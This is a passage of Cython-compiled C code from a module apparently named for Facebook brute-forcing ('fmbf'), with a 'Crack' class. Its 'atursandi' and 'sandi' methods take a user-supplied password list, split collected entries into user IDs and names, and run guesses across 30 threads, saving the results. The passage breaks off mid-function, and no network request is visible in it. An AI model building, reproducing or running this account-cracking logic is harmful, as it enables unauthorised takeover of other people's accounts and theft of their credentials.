    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_method);
  __pyx_t_1 = __pyx_v_method;
  __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 220, __pyx_L1_error)
  if (!__pyx_t_8) {
  } else {
    __pyx_t_7 = __pyx_t_8;
    goto __pyx_L8_bool_binop_done;
  }
  __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_03, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 220, __pyx_L1_error)
  __pyx_t_7 = __pyx_t_8;
  __pyx_L8_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_8 = (__pyx_t_7 != 0);
  if (__pyx_t_8) {

    
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 221, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = __Pyx_PyObject_Append(__pyx_t_1, __pyx_n_s_mobile); if (unlikely(__pyx_t_9 == ((int)-1))) __PYX_ERR(0, 221, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }
  __pyx_L3:;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_idz); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 222, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_4 = __pyx_t_1; __Pyx_INCREF(__pyx_t_4); __pyx_t_2 = 0;
    __pyx_t_10 = NULL;
  } else {
    __pyx_t_2 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 222, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_10 = Py_TYPE(__pyx_t_4)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 222, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_10)) {
      if (likely(PyList_CheckExact(__pyx_t_4))) {
        if (__pyx_t_2 >= PyList_GET_SIZE(__pyx_t_4)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_2); __Pyx_INCREF(__pyx_t_1); __pyx_t_2++; if (unlikely(0 < 0)) __PYX_ERR(0, 222, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_4, __pyx_t_2); __pyx_t_2++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 222, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_2 >= PyTuple_GET_SIZE(__pyx_t_4)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_2); __Pyx_INCREF(__pyx_t_1); __pyx_t_2++; if (unlikely(0 < 0)) __PYX_ERR(0, 222, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_4, __pyx_t_2); __pyx_t_2++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 222, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_10(__pyx_t_4);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 222, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XDECREF_SET(__pyx_v_urutan, __pyx_t_1);
    __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 223, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_randint); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 223, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_tampung); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 223, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = PyObject_Length(__pyx_t_5); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 223, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = PyInt_FromSsize_t(__pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 223, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_12 = NULL;
    __pyx_t_13 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
      __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_11);
      if (likely(__pyx_t_12)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
        __Pyx_INCREF(__pyx_t_12);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_11, function);
        __pyx_t_13 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_11)) {
      PyObject *__pyx_temp[3] = {__pyx_t_12, __pyx_int_0, __pyx_t_5};
      __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 223, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_11)) {
      PyObject *__pyx_temp[3] = {__pyx_t_12, __pyx_int_0, __pyx_t_5};
      __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 223, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    } else
    #endif
    {
      __pyx_t_14 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 223, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_14);
      if (__pyx_t_12) {
        __Pyx_GIVEREF(__pyx_t_12); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_12); __pyx_t_12 = NULL;
      }
      __Pyx_INCREF(__pyx_int_0);
      __Pyx_GIVEREF(__pyx_int_0);
      PyTuple_SET_ITEM(__pyx_t_14, 0+__pyx_t_13, __pyx_int_0);
      __Pyx_GIVEREF(__pyx_t_5);
      PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_13, __pyx_t_5);
      __pyx_t_5 = 0;
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_t_14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 223, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
    }
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF_SET(__pyx_v_xx, __pyx_t_1);
    __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_tampung); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 224, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_insert); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 224, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_14);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __pyx_t_11 = NULL;
    __pyx_t_13 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
      __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_14);
      if (likely(__pyx_t_11)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
        __Pyx_INCREF(__pyx_t_11);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_14, function);
        __pyx_t_13 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_14)) {
      PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_v_xx, __pyx_v_urutan};
      __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_14, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 224, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_GOTREF(__pyx_t_1);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_14)) {
      PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_v_xx, __pyx_v_urutan};
      __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_14, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 224, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_GOTREF(__pyx_t_1);
    } else
    #endif
    {
      __pyx_t_5 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 224, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (__pyx_t_11) {
        __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_11); __pyx_t_11 = NULL;
      }
      __Pyx_INCREF(__pyx_v_xx);
      __Pyx_GIVEREF(__pyx_v_xx);
      PyTuple_SET_ITEM(__pyx_t_5, 0+__pyx_t_13, __pyx_v_xx);
      __Pyx_INCREF(__pyx_v_urutan);
      __Pyx_GIVEREF(__pyx_v_urutan);
      PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_13, __pyx_v_urutan);
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_t_5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 224, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__55, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__56, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_v_pwx = __pyx_t_4;
  __pyx_t_4 = 0;

  
  __pyx_t_2 = PyObject_Length(__pyx_v_pwx); if (unlikely(__pyx_t_2 == ((Py_ssize_t)-1))) __PYX_ERR(0, 227, __pyx_L1_error)
  __pyx_t_8 = ((__pyx_t_2 < 6) != 0);
  if (__pyx_t_8) {

    
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 228, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

    
  }

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_sandi); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_14 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_14)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_14);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_4 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_14, __pyx_v_pwx) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_pwx);
  __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("fmbf.Crack.atursandi", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_method);
  __Pyx_XDECREF(__pyx_v_urutan);
  __Pyx_XDECREF(__pyx_v_xx);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_5Crack_5sandi(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); 
static PyMethodDef __pyx_mdef_4fmbf_5Crack_5sandi = {"sandi", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_4fmbf_5Crack_5sandi, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_4fmbf_5Crack_5sandi(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_pw = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("sandi (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_pw,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pw)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("sandi", 1, 2, 2, 1); __PYX_ERR(0, 231, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "sandi") < 0)) __PYX_ERR(0, 231, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_self = values[0];
    __pyx_v_pw = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("sandi", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 231, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("fmbf.Crack.sandi", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_4fmbf_5Crack_4sandi(__pyx_self, __pyx_v_self, __pyx_v_pw);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_5Crack_4sandi(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_pw) {
  PyObject *__pyx_v_fall = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_nama = NULL;
  PyObject *__pyx_v_depan = NULL;
  PyObject *__pyx_v_z = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  Py_ssize_t __pyx_t_14;
  PyObject *(*__pyx_t_15)(PyObject *);
  int __pyx_t_16;
  int __pyx_t_17;
  int __pyx_t_18;
  PyObject *__pyx_t_19 = NULL;
  int __pyx_t_20;
  PyObject *__pyx_t_21 = NULL;
  PyObject *__pyx_t_22 = NULL;
  PyObject *__pyx_t_23 = NULL;
  PyObject *__pyx_t_24 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("sandi", 0);

  
   {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 232, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 232, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 232, __pyx_L1_error)
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 232, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 232, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 232, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 232, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
         {
          __pyx_v_fall = __pyx_t_1;
          __pyx_t_1 = 0;

          
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_simpan_hasil); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 233, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_2 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 233, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tampung); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 234, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
            __pyx_t_3 = __pyx_t_1; __Pyx_INCREF(__pyx_t_3); __pyx_t_9 = 0;
            __pyx_t_10 = NULL;
          } else {
            __pyx_t_9 = -1; __pyx_t_3 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 234, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_10 = Py_TYPE(__pyx_t_3)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 234, __pyx_L7_error)
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          for (;;) {
            if (likely(!__pyx_t_10)) {
              if (likely(PyList_CheckExact(__pyx_t_3))) {
                if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_3)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_1 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_9); __Pyx_INCREF(__pyx_t_1); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 234, __pyx_L7_error)
                #else
                __pyx_t_1 = PySequence_ITEM(__pyx_t_3, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 234, __pyx_L7_error)
                __Pyx_GOTREF(__pyx_t_1);
                #endif
              } else {
                if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_3)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_3, __pyx_t_9); __Pyx_INCREF(__pyx_t_1); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 234, __pyx_L7_error)
                #else
                __pyx_t_1 = PySequence_ITEM(__pyx_t_3, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 234, __pyx_L7_error)
                __Pyx_GOTREF(__pyx_t_1);
                #endif
              }
            } else {
              __pyx_t_1 = __pyx_t_10(__pyx_t_3);
              if (unlikely(!__pyx_t_1)) {
                PyObject* exc_type = PyErr_Occurred();
                if (exc_type) {
                  if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                  else __PYX_ERR(0, 234, __pyx_L7_error)
                }
                break;
              }
              __Pyx_GOTREF(__pyx_t_1);
            }
            __Pyx_XDECREF_SET(__pyx_v_data, __pyx_t_1);
            __pyx_t_1 = 0;

            
            {
              __Pyx_PyThreadState_declare
              __Pyx_PyThreadState_assign
              __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
              __Pyx_XGOTREF(__pyx_t_11);
              __Pyx_XGOTREF(__pyx_t_12);
              __Pyx_XGOTREF(__pyx_t_13);
               {

                
                __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 236, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_1));
                __pyx_t_1 = 0;

                
                __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_data, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 237, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_5 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                  __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
                  if (likely(__pyx_t_5)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                    __Pyx_INCREF(__pyx_t_5);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_2, function);
                  }
                }
                __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_5, __pyx_kp_s__25) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_s__25);
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 237, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                __pyx_t_2 = __Pyx_GetItemInt(__pyx_t_1, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 237, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_2);
                __pyx_t_2 = 0;

                
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_data, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 238, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_5 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                  __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
                  if (likely(__pyx_t_5)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                    __Pyx_INCREF(__pyx_t_5);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_1, function);
                  }
                }
                __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_kp_s__25) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_s__25);
